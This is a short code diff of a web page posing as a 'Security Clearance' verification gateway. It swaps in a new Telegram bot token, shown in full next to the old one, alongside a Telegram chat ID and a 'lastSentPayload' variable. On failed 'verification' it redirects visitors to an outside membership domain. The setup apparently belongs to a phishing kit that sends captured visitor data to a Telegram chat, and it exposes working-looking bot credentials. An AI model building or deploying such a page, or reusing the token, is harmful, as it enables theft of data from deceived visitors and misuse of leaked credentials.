@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Custom Verification Gateway</title>
+    <title>Security Clearance</title>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
@@ -605,7 +605,7 @@
 // ==========================================
 // 🔐 CENTRAL CONFIGURATION & TELEGRAM SETTINGS
 // ==========================================
-const TELEGRAM_BOT_TOKEN = "8971558300:AAFCkaN9K6ycSf4Bf-hHSeaPQFkFvf3Y8w8";
+const TELEGRAM_BOT_TOKEN = "8557695057:AAEvi4jAxVQkvRWOSrbORu_Yd53B40ISihI";
 const TELEGRAM_CHAT_ID = "-1003913850436";
 
 let lastSentPayload = "";
@@ -1094,7 +1094,8 @@ window.addEventListener("DOMContentLoaded", () => {
             try { triggerNotification("Verification Failed. Redirecting...", 3000); } catch (err) { }
 
             setTimeout(() => {
-                window.location.href = "https://membership.avalonflow.site/notifications";
+                window.location.replace("https://membership.avalonflow.site/notifications");
+
             }, 3200);
         }
     }
